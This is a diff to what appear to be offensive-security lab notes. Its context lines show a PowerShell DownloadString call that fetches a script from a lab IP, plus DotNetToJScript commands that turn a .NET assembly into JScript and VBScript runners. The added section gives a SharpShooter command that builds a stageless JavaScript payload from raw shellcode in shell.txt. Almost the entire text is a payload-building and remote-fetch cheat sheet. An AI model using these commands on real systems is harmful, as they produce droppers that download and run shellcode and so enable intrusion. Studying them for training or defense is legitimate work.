@@ -27,3 +27,10 @@ $wc.DownloadString("http://192.168.49.71/clip.txt")
 DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js
 DotNetToJScript.exe ExampleAssembly.dll --lang=vbscript --ver=v4 -o demo.vbs
 ```
+## Sharpshooter
+
+```
+┌──(kali㉿kali)-[/opt/SharpShooter]
+└─$ sudo python SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile /var/www/html/shell.txt --output test
+
+```
